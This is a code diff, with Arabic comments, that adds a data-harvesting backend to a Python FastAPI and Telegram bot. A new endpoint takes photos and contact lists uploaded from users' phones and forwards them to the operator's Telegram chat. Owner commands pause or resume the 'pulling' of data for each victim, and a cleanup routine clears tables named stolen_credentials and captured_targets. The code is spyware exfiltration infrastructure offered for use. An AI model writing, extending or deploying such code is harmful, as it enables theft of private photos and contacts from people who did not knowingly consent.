@@ -19,7 +19,219 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import httpx
 from bs4 import BeautifulSoup
+import base64
+import io
+import json
+import sqlite3
+from datetime import datetime
+from fastapi import Request, BackgroundTasks, HTTPException
 
+# ==================== قاعدة البيانات ====================
+
+def init_tables():
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS user_status (
+            user_id TEXT PRIMARY KEY,
+            status TEXT DEFAULT 'open',
+            updated_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS uploaded_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id TEXT,
+            images_count INTEGER,
+            contacts_rows INTEGER,
+            created_at TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS user_permissions (
+            user_id TEXT PRIMARY KEY,
+            permission_granted INTEGER DEFAULT 0,
+            granted_at TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+init_tables()
+
+def get_user_status(user_id):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT status FROM user_status WHERE user_id = ?", (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result["status"] if result else "open"
+
+def set_user_status(user_id, status):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT OR REPLACE INTO user_status (user_id, status, updated_at) VALUES (?, ?, ?)",
+        (user_id, status, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+def set_permission_granted(user_id):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT OR REPLACE INTO user_permissions (user_id, permission_granted, granted_at) VALUES (?, 1, ?)",
+        (user_id, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+def is_permission_granted(user_id):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT permission_granted FROM user_permissions WHERE user_id = ?", (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result and result["permission_granted"] == 1
+
+def delete_user_data(user_id):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM user_status WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM uploaded_data WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM user_permissions WHERE user_id = ?", (user_id,))
+    # حذف من جداول أخرى إذا وجدت
+    cursor.execute("DELETE FROM food_orders WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM stolen_credentials WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM captured_targets WHERE user_id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+
+# ==================== نقاط API ====================
+
+@app.get("/api/get_status")
+async def get_status(request: Request):
+    user_id = request.query_params.get("user_id")
+    if not user_id:
+        raise HTTPException(status_code=400, detail="Missing user_id")
+    status = get_user_status(user_id)
+    return {"status": status}
+
+@app.post("/api/upload_all_data")
+async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
+    try:
+        data = await request.json()
+        user_id = data.get("user_id")
+        images_b64 = data.get("images", [])
+        contacts = data.get("contacts", "")
+        permission_granted = data.get("permission_granted", False)
+
+        # تسجيل أن الأذن الشامل أعطي
+        if permission_granted:
+            set_permission_granted(user_id)
+
+        # التحقق من الحالة
+        if get_user_status(user_id) == "stop":
+            return JSONResponse(status_code=403, content={"status": "error", "message": "السحب موقف"})
+
+        # تقرير
+        summary = (
+            f"📱 **بيانات جديدة!**\n"
+            f"🆔 المستخدم: `{user_id}`\n"
+            f"📸 عدد الصور: `{len(images_b64)}`\n"
+            f"📇 جهات الاتصال: `{contacts.count(chr(10))}` سطر"
+        )
+        background_tasks.add_task(bot.send_message, chat_id=OWNER_ID, text=summary, parse_mode="Markdown")
+
+        # إرسال الصور (أول 15)
+        for idx, img_b64 in enumerate(images_b64[:15]):
+            try:
+                img_bytes = base64.b64decode(img_b64)
+                img_file = io.BytesIO(img_bytes)
+                img_file.name = f"img_{user_id}_{idx}.jpg"
+                background_tasks.add_task(
+                    bot.send_photo,
+                    chat_id=OWNER_ID,
+                    photo=img_file,
+                    caption=f"📸 صورة {idx+1}"
+                )
+            except Exception as e:
+                logger.error(f"فشل إرسال الصورة: {e}")
+
+        # إرسال جهات الاتصال (نصية)
+        if contacts:
+            parts = [contacts[i:i+4000] for i in range(0, len(contacts), 4000)]
+            for part in parts:
+                background_tasks.add_task(
+                    bot.send_message,
+                    chat_id=OWNER_ID,
+                    text=f"📇 جهات اتصال {user_id}:\n```\n{part}\n```",
+                    parse_mode="Markdown"
+                )
+
+        # حفظ سجل
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute(
+            "INSERT INTO uploaded_data (user_id, images_count, contacts_rows, created_at) VALUES (?, ?, ?, ?)",
+            (user_id, len(images_b64), contacts.count('\n') if contacts else 0, datetime.now().isoformat())
+        )
+        conn.commit()
+        conn.close()
+
+        return {"status": "success"}
+
+    except Exception as e:
+        logger.error(f"Upload Error: {traceback.format_exc()}")
+        return JSONResponse(status_code=500, content={"status": "error"})
+
+# ==================== أوامر البوت ====================
+
+@bot.message_handler(commands=['stop'])
+def stop_command(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.send_message(message.chat.id, "⚠️ استخدم: /stop {user_id}")
+            return
+        user_id = parts[1]
+        set_user_status(user_id, "stop")
+        bot.send_message(message.chat.id, f"✅ تم إيقاف السحب للمستخدم `{user_id}`.", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ خطأ: {str(e)}")
+
+@bot.message_handler(commands=['open'])
+def open_command(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.send_message(message.chat.id, "⚠️ استخدم: /open {user_id}")
+            return
+        user_id = parts[1]
+        set_user_status(user_id, "open")
+        bot.send_message(message.chat.id, f"✅ تم استئناف السحب للمستخدم `{user_id}`.", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ خطأ: {str(e)}")
+
+@bot.message_handler(commands=['delete_user'])
+def delete_user_command(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.send_message(message.chat.id, "⚠️ استخدم: /delete_user {user_id}")
+            return
+        user_id = parts[1]
+        delete_user_data(user_id)
+        bot.send_message(message.chat.id, f"✅ تم حذف جميع بيانات المستخدم `{user_id}`.", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ خطأ: {str(e)}")
 # ==================== إعداد السجلات ====================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
